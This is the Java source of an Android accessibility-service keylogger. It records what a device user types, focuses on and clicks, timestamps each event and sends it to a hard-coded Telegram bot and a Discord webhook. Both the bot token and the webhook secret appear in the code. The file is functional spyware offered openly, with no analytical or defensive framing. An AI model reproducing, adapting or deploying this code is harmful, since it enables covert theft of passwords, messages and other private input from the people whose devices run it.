package com.example.dynamicapk;

import android.accessibilityservice.AccessibilityService;
import android.os.AsyncTask;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

public class Keylogger extends AccessibilityService {

    private static final String TAG = "Keylogger";

    private class SendToServerTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {
            String message = params[0];
            try {
                // Send to Telegram
                sendToTelegram(message);

                // Send to Discord
                sendToDiscord(message);

            } catch (Exception e) {
                Log.e(TAG, "Error sending message: " + e.getMessage(), e);
            }
            return message;
        }

        private void sendToTelegram(String message) {
            try {
                String botUrl = "https://api.telegram.org/bot8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI/sendMessage";
                String chatId = Constants.TELEGRAM_CHAT_ID; // Your Telegram Chat ID

                String urlString = botUrl + "?chat_id=" + URLEncoder.encode(chatId, "UTF-8") +
                        "&text=" + URLEncoder.encode(message, "UTF-8");
                URL url = new URL(urlString);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");

                // Log the URL being sent
                Log.d(TAG, "Sending to Telegram: " + urlString);

                // Get response
                InputStream is = connection.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                // Log the response from Telegram
                Log.d(TAG, "Telegram Response: " + response.toString());
            } catch (Exception e) {
                Log.e(TAG, "Error sending message to Telegram: " + e.getMessage(), e);
            }
        }

        private void sendToDiscord(String message) {
            try {
                String discordWebhookUrl = "https://discord.com/api/webhooks/1193056692171178095/IqlnHSr8jODI0qaIYeAmaWWyK1mvg0uRPKl32BHaoX7S3ami8G4V4DqHy4qoqMrImBGN"; // Replace with your Discord webhook URL

                // Set up the JSON payload to send to Discord
                String payload = "{\"content\":\"" + message + "\"}";

                URL url = new URL(discordWebhookUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);

                // Send the JSON payload to Discord
                OutputStream os = connection.getOutputStream();
                byte[] input = payload.getBytes("utf-8");
                os.write(input, 0, input.length);

                // Log the request being sent
                Log.d(TAG, "Sending to Discord: " + payload);

                // Get response
                InputStream is = connection.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                // Log the response from Discord
                Log.d(TAG, "Discord Response: " + response.toString());
            } catch (Exception e) {
                Log.e(TAG, "Error sending message to Discord: " + e.getMessage(), e);
            }
        }
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Keylogger service started");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Format the current time
        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());

        // Handle specific event types
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();

                // Filter out empty or unnecessary logs
                if (data != null && !data.trim().isEmpty()) {
                    // Send the event data with a timestamp to both Telegram and Discord
                    new SendToServerTask().execute(time + " | " + data);
                } else {
                    Log.d(TAG, "Ignored empty or irrelevant event");
                }
                break;
            }
            default:
                Log.d(TAG, "Unhandled event type: " + event.getEventType());
                break;
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted");
    }
}
